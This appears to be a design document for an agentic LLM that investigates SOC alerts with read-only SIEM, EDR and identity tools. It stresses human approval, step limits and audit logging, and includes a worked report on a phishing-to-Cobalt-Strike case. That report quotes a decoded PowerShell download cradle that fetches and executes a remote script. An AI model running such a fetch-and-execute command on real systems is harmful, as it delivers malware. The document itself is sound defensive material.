# UC-14: Agentic Investigation Execution

## Category

AI-Assisted Triage

## Summary

An agentic LLM conducts a complete alert investigation by dynamically deciding what to query, evaluating results, pivoting based on findings, and compiling a comprehensive investigation report — all without a predetermined playbook path. The agent reads the investigation guide (from UC-15), has access to tools (SIEM queries, EDR lookups, identity queries, threat intel APIs), and reasons about what to investigate next based on what it has found so far. This is fundamentally different from a SOAR playbook: the investigation path is not hardcoded. The agent adapts its approach based on the evidence as it unfolds.

## Problem Statement

SOAR playbooks execute fixed sequences of steps: enrich the IP, check the hash, look up the user, assign the ticket. These work well for routine triage — the steps are the same regardless of what the enrichment returns. But real investigations are not linear. What you look at second depends on what you found first.

When an analyst investigates an alert, they follow a reasoning process:

1. Read the alert and understand what it detected
2. Decide what to check first based on the alert type and initial context
3. Execute the first lookup and evaluate the result
4. Based on that result, decide whether to pivot (investigate a related entity), dig deeper (query for more detail on the same entity), or move to the next standard check
5. Repeat until they have enough evidence to reach a conclusion
6. Compile findings into a report or ticket update

Step 4 is the critical one that SOAR playbooks cannot handle. A playbook cannot say "if the EDR process tree shows lateral movement, then query the destination host's authentication logs for the source user's credentials" unless someone anticipated that exact scenario and coded the branching logic. In practice, investigation paths branch in ways too numerous and context-dependent to encode in static playbook logic.

This is the highest-value, highest-complexity AI use case in this category. An agentic LLM can replicate the senior analyst's reasoning process — reading investigation guides, querying tools, evaluating results, deciding what to do next — at machine speed and at scale across alerts that would otherwise sit in the queue waiting for human attention.

## Prerequisites (What Your SIEM/SOAR Should Already Handle)

This use case has the most extensive prerequisites of any in this repo. Every prerequisite for UC-11, UC-12, and UC-13 applies here, plus:

- **SOAR playbook enrichment (standard steps):** All deterministic enrichment steps — threat intel lookups, asset/CMDB queries, identity/AD lookups, vulnerability context — should still be handled by SOAR playbooks before the agent starts. The agent should not waste reasoning cycles on tasks that a SOAR playbook step can do deterministically and reliably.
- **API access to investigation tools:** The agent needs programmatic access to the tools analysts use during investigations:
  - **SIEM query API** — Execute KQL, ESQL, EQL, or SPL queries against alert and event indices
  - **EDR API** — Query process trees, file activity, network connections on specific hosts (CrowdStrike, SentinelOne, Defender for Endpoint, Carbon Black)
  - **Identity/AD API** — Query user attributes, group memberships, authentication logs, MFA status
  - **Threat intelligence API** — Look up IOC reputation, related campaigns, associated malware
  - **Network security tools API** — Firewall logs, proxy logs, DNS logs, NDR alerts
  - **Cloud platform APIs** — CloudTrail, Azure Activity Log, GCP Audit Log for cloud-related alerts
  - **Ticketing/case management API** — Query prior incidents for the same entity, prior investigation outcomes
- **Investigation guides:** Per-rule or per-rule-category investigation guides (see UC-15) that define: what to verify, what log sources to check, what constitutes a true positive vs. false positive, expected evidence patterns, escalation criteria. These guides are the agent's instruction manual.
- **Sandboxed execution environment:** The agent should execute in a controlled environment with scoped permissions. Read-only access to investigation tools. No ability to execute response actions (isolate hosts, disable accounts) without explicit human approval.
- **Human-in-the-loop controls:** Clear handoff points where the agent must stop and wait for human approval before proceeding. Defined escalation triggers (high-severity findings, actions with blast radius, insufficient confidence).
- **Audit logging:** Every tool call the agent makes, every query it executes, and every reasoning step it takes must be logged for accountability and debugging.

**Partnership with DevSecOps/SOAR team is critical.** The agent needs stable, well-documented APIs with adequate rate limits and error handling. This is a cross-functional engineering effort — detection engineering defines what the agent should investigate, DevSecOps/SOAR engineering builds and maintains the tool integrations.

## Where AI Adds Value

The LLM provides dynamic reasoning over investigation data — the cognitive work that sits between "gather data" and "reach a conclusion":

1. **Dynamic investigation planning.** The agent reads the investigation guide and the alert context, then decides which investigation steps to execute and in what order. For a credential access alert, it might start with the EDR process tree. For a cloud API alert, it might start with the CloudTrail event history. The investigation plan adapts to the alert type, not a one-size-fits-all playbook.

2. **Result evaluation and pivoting.** After each tool call, the agent evaluates the result and decides what to do next. If the EDR process tree shows that the suspicious process was spawned by a legitimate management tool, the agent pivots to verify the management tool's scheduled activity. If the process tree shows lateral movement to another host, the agent pivots to investigate the destination host. This dynamic branching is impossible in a static playbook.

3. **Evidence synthesis.** As the investigation progresses, the agent maintains a running understanding of the evidence collected. It recognizes when it has enough evidence to reach a conclusion, when findings are contradictory (requiring further investigation), and when it lacks sufficient data to make a determination (requiring human escalation).

4. **Investigation report generation.** The agent compiles all findings, tool outputs, reasoning steps, and its conclusion into a structured investigation report. This report documents the complete investigation process — what was checked, what was found, and why the conclusion was reached. This report is immediately usable for incident documentation, shift handoffs, and compliance records.

5. **Consistency at scale.** A human analyst investigating 30 alerts follows different investigation paths for each, with varying thoroughness depending on fatigue, time pressure, and experience. The agent follows the investigation guide consistently for every alert, ensuring that critical checks are never skipped.

## AI Approach

**Agentic LLM with tool use (ReAct pattern).**

The agent operates in a reasoning-action loop (ReAct): think about what to do next, execute a tool call, observe the result, think about what it means, decide the next action. This continues until the agent reaches a conclusion or hits a stopping condition.

**Architecture:**

```
Alert + enrichment context + investigation guide
         ↓
    ┌─────────────────────────────────────┐
    │         AGENT REASONING LOOP        │
    │                                     │
    │  1. Read investigation guide        │
    │  2. Plan initial investigation      │
    │     steps                           │
    │  3. Execute tool call               │
    │     (SIEM query, EDR lookup, etc.)  │
    │  4. Evaluate result                 │
    │  5. Update working hypothesis       │
    │  6. Decide: pivot, continue,        │
    │     escalate, or conclude           │
    │  7. If not concluded → go to 3      │
    │                                     │
    │  STOPPING CONDITIONS:               │
    │  - Conclusion reached with          │
    │    sufficient evidence              │
    │  - Maximum step count reached       │
    │  - Human escalation triggered       │
    │  - API failure with no alternative  │
    │  - Confidence too low to proceed    │
    └─────────────────────────────────────┘
         ↓
    Investigation Report
    (findings, conclusion, evidence, reasoning trace)
```

**Key design elements:**

- **Tool definitions.** Each investigation tool is defined as a function the LLM can call, with typed parameters and documented behavior. Examples:
  - `query_siem(query: str, time_range: str) → results[]` — Execute a SIEM query
  - `get_process_tree(host: str, pid: int, time_range: str) → process_tree` — Get EDR process tree
  - `lookup_user(username: str) → user_profile` — Query AD/identity for user details
  - `check_threat_intel(indicator: str, type: str) → reputation` — IOC reputation lookup
  - `get_host_alerts(host: str, time_range: str) → alerts[]` — Get all alerts for a host
  - `get_authentication_logs(user: str, time_range: str) → auth_events[]` — Query auth logs
  - `get_network_connections(host: str, time_range: str) → connections[]` — Query network logs

- **System prompt.** Defines the agent's role, available tools, investigation methodology, output format, and constraints. The system prompt is substantial (2,000-4,000 tokens) and includes:
  - The agent's role as a SOC analyst conducting investigations
  - Available tools with descriptions and parameter formats
  - Investigation methodology (follow the investigation guide, verify before concluding)
  - Output format for the investigation report
  - Constraints (read-only, no response actions, escalation criteria, maximum step count)
  - Safety rails (do not fabricate evidence, cite specific tool outputs, flag uncertainty)

- **Investigation guide injection.** The investigation guide for the triggered rule (from UC-15) is included in the prompt as the agent's primary reference. If no rule-specific guide exists, a generic investigation template for the alert's MITRE tactic is used as fallback.

- **Step limit.** Enforce a maximum number of tool calls per investigation (e.g., 15-25) to prevent runaway investigations. If the agent hasn't reached a conclusion within the step limit, it must compile its findings so far and escalate to a human analyst with a clear summary of what was checked and what remains unresolved.

- **Working memory.** The agent's reasoning context accumulates with each step. For longer investigations, implement a summarization step: periodically compress earlier findings into a summary to keep the context window manageable while preserving the key evidence.

## Data Requirements

### Inputs

| Input | Format | Key Fields Used |
|---|---|---|
| Alert record | SIEM alert JSON | `rule.name`, `rule.id`, `kibana.alert.severity`, `kibana.alert.rule.threat`, `host.name`, `user.name`, `process.*`, `source.ip`, `destination.ip`, `event.action`, `@timestamp` |
| SOAR enrichment package | JSON | All enrichment from UC-11 inputs: threat intel, asset/CMDB, identity/AD, vulnerability, geo/ASN, historical alerts |
| Investigation guide | Structured text/Markdown | Per-rule investigation steps, verification criteria, expected evidence patterns, true positive indicators, false positive indicators, escalation criteria |
| Tool API access | API endpoints | SIEM query API, EDR API, identity API, threat intel API, network security API, cloud platform APIs |

> **Note:** Alert data follows the SIEM's standard alert schema with normalized source event fields. Rule files follow their format's defined schema (Elastic TOML, Sigma YAML, Splunk YAML, etc.). These are structured, documented formats — see [data-requirements/](../../data-requirements/) for platform-specific field references.

### Outputs

The agent produces a comprehensive investigation report.

**Concrete output example:**

```markdown
# Investigation Report: Suspicious Encoded PowerShell Command

## Alert Details
- **Rule:** Suspicious Encoded PowerShell Command
- **Severity:** High
- **Host:** WKSTN-3187 (workstation, Sales department, user: mgarcia)
- **Timestamp:** 2025-03-15T16:42:18Z
- **MITRE:** T1059.001 (Command and Scripting Interpreter: PowerShell)

## Investigation Summary

**VERDICT: TRUE POSITIVE — CONFIRMED COMPROMISE**
**Confidence: High (0.92)**

User mgarcia's workstation (WKSTN-3187) executed an encoded PowerShell download
cradle that retrieved and executed a Cobalt Strike beacon. The investigation
confirmed: initial access via a malicious email attachment, beacon deployment,
credential harvesting from LSASS, and attempted lateral movement to two
additional hosts. The lateral movement attempts were blocked by EDR.

## Investigation Steps Executed

### Step 1: Decode PowerShell payload
**Action:** Examined the encoded command line from the alert
**Finding:** Base64 payload decodes to:
`IEX(New-Object Net.WebClient).DownloadString('https://cdn-update[.]com/check.ps1')`
This is a standard download cradle pattern.
**Decision:** Suspicious — check threat intel on the domain.

### Step 2: Threat intel lookup on cdn-update[.]com
**Action:** `check_threat_intel("cdn-update.com", "domain")`
**Finding:** Domain flagged by 4/6 threat intel feeds. Associated with Cobalt
Strike C2 infrastructure. First seen 2025-03-10 (5 days ago). Registered via
Namecheap with privacy protection. Resolves to 91.215.85.142 (AS48031,
Russia-based hosting).
**Decision:** High-confidence malicious domain. Investigate process chain.

### Step 3: EDR process tree on WKSTN-3187
**Action:** `get_process_tree("WKSTN-3187", 9412, "2025-03-15T16:30:00Z/2025-03-15T17:30:00Z")`
**Finding:** Process chain:
```
outlook.exe (PID 3201)
  └─ WINWORD.EXE (PID 5844)
      └─ cmd.exe (PID 7102)
          └─ powershell.exe (PID 9412) ← alert trigger
              └─ rundll32.exe (PID 10221) — loaded beacon.dll from %TEMP%
                  └─ rundll32.exe (PID 10445) — injected into svchost.exe
```
**Decision:** Full attack chain visible. Started from Outlook → Word macro →
cmd → PowerShell → Cobalt Strike beacon. Check email for initial delivery.

### Step 4: Email log query for mgarcia
**Action:** `query_siem("FROM logs-o365* | WHERE user.name == 'mgarcia' AND
  @timestamp >= '2025-03-15T16:00:00Z' AND @timestamp <= '2025-03-15T16:45:00Z'
  AND event.action == 'MailItemAccessed' | SORT @timestamp")`
**Finding:** mgarcia opened email from "invoice-march@supplier-portal[.]net"
at 16:38 UTC with attachment "Invoice_March2025.docm" (SHA256:
a1b2c3d4e5f6...). Subject: "March Invoice - Action Required".
**Decision:** Confirmed phishing delivery. Check for LSASS access.

### Step 5: Check for credential access
**Action:** `query_siem("FROM .internal.alerts-security.alerts-default-*
  | WHERE host.name == 'WKSTN-3187' AND
  kibana.alert.rule.threat.tactic.name == 'Credential Access' AND
  @timestamp >= '2025-03-15T16:40:00Z'")`
**Finding:** 2 alerts: "LSASS Memory Access Detected" at 16:44:02 and 16:44:03
from rundll32.exe (PID 10221). Confirmed Mimikatz-style credential dumping.
**Decision:** Credentials likely compromised. Check for lateral movement.

### Step 6: Check for lateral movement attempts
**Action:** `get_authentication_logs("mgarcia", "2025-03-15T16:44:00Z/2025-03-15T18:00:00Z")`
**Finding:** Two authentication attempts from WKSTN-3187 to other hosts:
- 16:47:12 — SMB authentication to FILE-SVR-02 → **BLOCKED by EDR**
  (SentinelOne blocked suspicious remote process execution)
- 16:48:01 — RDP authentication to WKSTN-5512 → **BLOCKED by EDR**
  (SentinelOne blocked suspicious lateral movement pattern)
**Decision:** Lateral movement attempted but contained by EDR. Check if
any succeeded.

### Step 7: Verify no successful lateral movement
**Action:** `get_host_alerts("FILE-SVR-02", "2025-03-15T16:45:00Z/2025-03-15T18:00:00Z")`
and `get_host_alerts("WKSTN-5512", "2025-03-15T16:45:00Z/2025-03-15T18:00:00Z")`
**Finding:** No alerts or suspicious activity on either target host beyond the
blocked authentication attempts. EDR containment was effective.
**Decision:** Lateral movement contained. Compile report.

## Evidence Summary

| Evidence | Source | Significance |
|---|---|---|
| Encoded PowerShell download cradle | Alert source event | Initial execution vector |
| cdn-update[.]com — known Cobalt Strike C2 | Threat intel (4/6 feeds) | Confirmed malicious infrastructure |
| Process chain: Outlook → Word → cmd → PowerShell → rundll32 | EDR process tree | Full attack chain from phishing to beacon |
| Phishing email from invoice-march@supplier-portal[.]net | O365 email logs | Initial access vector confirmed |
| LSASS memory access by rundll32.exe | SIEM alert | Credential harvesting confirmed |
| Lateral movement to 2 hosts — blocked by EDR | Authentication logs + EDR | Attempted spread, contained |

## Recommended Actions

1. **IMMEDIATE:** Isolate WKSTN-3187 (if not already isolated by EDR)
2. **IMMEDIATE:** Reset mgarcia's password and revoke active sessions
3. Block cdn-update[.]com and 91.215.85.142 at perimeter firewall and proxy
4. Block sender invoice-march@supplier-portal[.]net in email gateway
5. Search environment-wide for:
   - Any connections to cdn-update[.]com or 91.215.85.142
   - Any emails from supplier-portal[.]net
   - SHA256 hash a1b2c3d4e5f6... (malicious Word document)
6. Reimage WKSTN-3187 — compromised beyond reliable remediation
7. Monitor mgarcia's credentials for 30 days post-reset for any
   unauthorized usage
8. Submit Invoice_March2025.docm to malware analysis sandbox

## Investigation Metadata

- **Total tool calls:** 7
- **Investigation duration:** 34 seconds
- **Agent model:** Claude Sonnet 4
- **Investigation guide used:** Suspicious Encoded PowerShell Command (v2.1)
```

## Implementation Notes

**This is a multi-team engineering effort.** Do not attempt this as a solo detection engineering project. The requirements span:
- **Detection engineering:** Investigation guides, alert context design, investigation quality criteria
- **DevSecOps/SOAR engineering:** API integrations, tool definitions, rate limit management, error handling, authentication management
- **Security architecture:** Access control design, sandboxing, audit logging, data classification
- **SOC operations:** Workflow integration, human-in-the-loop design, escalation procedures, analyst training

**Tool reliability is the critical success factor.** The agent is only as good as its tools. If the EDR API returns errors 20% of the time, the SIEM query API times out under load, or the identity lookup returns stale data, the agent will produce unreliable investigations. Invest heavily in API reliability, error handling, and graceful degradation before investing in agent prompt engineering.

**Start narrow, expand gradually.** Do not attempt to build an agent that investigates all alert types on day one. Start with 3-5 well-understood alert types where:
- Investigation guides already exist
- The investigation path is well-understood by senior analysts
- API access to the required tools is already reliable
- Historical investigation data exists for validation

Validate the agent's investigation quality against historical investigations before expanding to additional alert types.

**Step limits and cost controls.** Each tool call consumes LLM tokens (for the reasoning step) and API calls (for the tool execution). An investigation with 15 tool calls might consume 10,000-20,000 LLM tokens and 15 API calls across 5 different tools. At scale, implement:
- Per-investigation step limit (e.g., 25 tool calls maximum)
- Per-investigation token budget
- Per-hour API rate limits per tool
- Cost monitoring dashboard

**Reasoning trace logging.** Log the agent's complete reasoning trace — every thought, every tool call, every observation, every decision. This is essential for:
- Debugging incorrect investigations
- Understanding why the agent missed something
- Improving the system prompt and investigation guides
- Compliance and accountability requirements
- Building trust with analysts who can review the agent's reasoning

**Guardrails for response actions.** The agent should NEVER execute response actions (host isolation, account disable, firewall block) autonomously. These actions have blast radius — isolating the wrong host or disabling the wrong account disrupts business operations. The agent recommends actions; a human (or a separately authorized SOAR playbook with its own approval workflow) executes them. This boundary is non-negotiable for initial deployments and should only be relaxed with extensive validation and an explicit CISO-approved error budget.

**Model selection matters significantly.** Agentic tool use requires strong reasoning capabilities. Smaller, faster models that work well for UC-11 (single-turn verdicts) will underperform in agentic investigations where the model must maintain context across many steps, recognize when to pivot, and avoid going in circles. Use the most capable model available (Claude Opus/Sonnet 4, GPT-4o) for this use case. The cost difference per investigation is small; the quality difference is large.

**Handling dead ends.** The agent will sometimes exhaust its investigation options without reaching a clear conclusion — the threat intel is inconclusive, the EDR data is incomplete, the process tree was lost due to host reboot. The agent must recognize dead ends and escalate with a clear summary of what was checked and what remains unknown, rather than fabricating a conclusion to fill the gap. Train this behavior explicitly in the system prompt with examples of appropriate escalation.

## Dependencies

- **Prerequisite — All Five Pillars:** This use case requires maturity across all prerequisites. Data foundations (APIs to all investigation tools), process maturity (investigation guides, handoff criteria), human element (trust in agentic AI, error budget acceptance), technology stack (API-driven tools, rate limit capacity), metrics and feedback (investigation quality measurement, feedback loop).
- [UC-11: LLM Triage Verdicts](11-llm-triage-verdicts.md) — Initial triage verdict can determine whether an alert warrants full agentic investigation. Low-confidence or "escalate" verdicts from UC-11 are candidates for UC-14.
- [UC-13: Natural Language Alert Query](13-natural-language-alert-query.md) — The agent uses the same text-to-query capability as one of its tools. The query generation component can be shared.
- [UC-15: LLM Investigation Guide Generation](../rule-content-engineering/15-llm-investigation-guide-generation.md) — Investigation guides provide the agent's instruction manual. Without per-rule investigation guides, the agent operates on generic methodology only, reducing investigation quality.
- [UC-12: Alert Cluster Narrative Synthesis](12-alert-cluster-narrative-synthesis.md) — For alert clusters, the agent may use cluster narrative synthesis as an initial assessment step before conducting per-alert deep investigation.

## Complexity Assessment

| Dimension | Rating | Notes |
|---|---|---|
| Data engineering | High | Requires reliable API access to 5-7 different security tools, each with different authentication, rate limits, response formats, and failure modes. Tool integration is the largest engineering effort. |
| AI/ML complexity | Very High | Agentic ReAct pattern with multi-step reasoning, tool use, dynamic planning, and evidence synthesis. Requires careful system prompt engineering, step limits, guardrails, and extensive testing. Model selection is critical. |
| Integration effort | Very High | Touches every security tool in the stack. Requires cross-team collaboration (detection engineering, DevSecOps, security architecture, SOC operations). Workflow integration, audit logging, human-in-the-loop controls, and escalation procedures must all be designed and built. |
| Overall | **Very High** | This is the highest-complexity use case in this repo. It is also the highest-value use case — a well-built investigation agent can replicate hours of senior analyst work in seconds. But the engineering effort is substantial and the failure modes are numerous. Do not attempt this before successfully deploying UC-11 and UC-13. |

## Real-World Considerations

**Maturity ladder.** Deploy the AI-Assisted Triage use cases in order of complexity:

1. **UC-11 (LLM Triage Verdicts)** — Single-turn verdicts with pre-assembled context. Validates LLM integration, enrichment quality, and organizational trust.
2. **UC-12 (Alert Cluster Narrative Synthesis)** — Larger context, narrative generation. Validates the LLM's ability to synthesize across multiple data points.
3. **UC-13 (Natural Language Alert Query)** — Interactive query generation. Validates text-to-query accuracy and SIEM API integration.
4. **UC-14 (Agentic Investigation Execution)** — Multi-step, multi-tool reasoning. Builds on all prior capabilities.

Skipping steps will result in building on an unreliable foundation.

**Agent accuracy must be measured rigorously.** Establish a golden set of 50+ historical investigations with known correct outcomes. Run the agent against this golden set and measure:
- Did the agent reach the correct conclusion?
- Did the agent check all required evidence sources?
- Did the agent miss any critical findings?
- Did the agent follow the investigation guide?
- Was the investigation report complete and accurate?

Set a minimum accuracy threshold (e.g., 85% correct conclusions, 95% required checks executed) before deploying to production. Re-run the golden set after every system prompt change, model upgrade, or tool modification.

**Tool failure is the normal case.** In production, at least one tool call will fail in a significant percentage of investigations — API timeouts, rate limits, permissions errors, service outages. The agent must handle failures gracefully: retry with backoff, use alternative data sources, note the data gap in the report, and continue the investigation with available tools. An agent that halts on the first API error is useless in production.

**Investigation scope creep.** Without clear stopping criteria, the agent will investigate indefinitely — each finding opens new questions, each new question leads to more tool calls. Enforce scope boundaries: (1) step limit (max tool calls), (2) time limit (max wall-clock time), (3) scope limit (investigate the triggered alert and immediately related entities, not the entire environment). The agent should compile findings and escalate rather than spiraling into an open-ended threat hunt.

**Organizational readiness.** This use case requires leadership that is comfortable with an AI agent autonomously querying production security tools and producing investigation conclusions. Many organizations are not ready for this. The prerequisite work in Pillar 3 (Human Element) — defining error budgets, redefining analyst roles, establishing accountability for AI decisions — must be completed before deploying agentic investigation.

**Do not replace analysts — augment them.** Position the agent as a force multiplier: it handles the first 80% of investigation work (data gathering, standard checks, evidence compilation), and the analyst handles the remaining 20% (judgment calls, edge cases, response decisions). The agent's report is a draft investigation that the analyst reviews, validates, and acts on — not a final determination that triggers automatic response.

**Vendor landscape.** Multiple startups and established vendors are building agentic investigation capabilities: Prophet Security, Dropzone AI, Exaforce, Qevlar AI, Intezer, D3 Morpheus. Evaluate whether to build custom or adopt a vendor solution. Custom builds offer maximum control and integration with your specific tool stack. Vendor solutions offer faster time-to-value but may not integrate with all your tools or understand your environment-specific context.

## Related Use Cases

- [UC-11: LLM Triage Verdicts](11-llm-triage-verdicts.md) — First step in the maturity ladder. Agentic investigation extends single-turn verdicts to multi-step reasoning.
- [UC-12: Alert Cluster Narrative Synthesis](12-alert-cluster-narrative-synthesis.md) — The agent may invoke cluster narrative synthesis as part of its investigation when it discovers related alerts.
- [UC-13: Natural Language Alert Query](13-natural-language-alert-query.md) — The agent uses text-to-query as one of its tools for SIEM queries.
- [UC-15: LLM Investigation Guide Generation](../rule-content-engineering/15-llm-investigation-guide-generation.md) — Produces the investigation guides that the agent follows. Quality of guides directly impacts quality of investigations.
- [UC-20: Analyst Workflow Optimization](../strategic/20-analyst-workflow-optimization.md) — Agent investigation logs provide rich data for analyzing investigation patterns and optimizing workflows.
- [UC-22: Detection Program Health Reporting](../strategic/22-detection-program-health-reporting.md) — Agent investigation outcomes (TP/FP conclusions, investigation duration, escalation rates) feed into program health metrics.

## References

- Yao et al., "ReAct: Synergizing Reasoning and Acting in Language Models" (2022) — Foundational paper on the ReAct pattern used for agentic tool use
- Anthropic, "Tool Use (Function Calling)" — API reference for building tool-using agents with Claude
- OpenAI, "Function Calling and Agents" — API reference for building tool-using agents with GPT models
- LangChain, "Agents" — Framework for building ReAct-style agents with tool use
- LangGraph — Framework for building stateful, multi-step agent workflows with explicit control flow
- Anthropic, "Building Effective Agents" (2024) — Best practices for agentic LLM system design
- OWASP, "Agentic AI Threats and Mitigations" (2025) — Security considerations for agentic AI systems, including tool poisoning and prompt injection risks
- Anton Chuvakin, "Beyond 'Is Your SOC AI Ready?' Plan the Journey!" (January 2026) — Framework for maturity-based AI deployment in SOCs
- Prophet Security — Commercial agentic SOC investigation platform
- Dropzone AI — Commercial autonomous SOC analysis platform
- Exaforce — Commercial AI SOC analyst platform
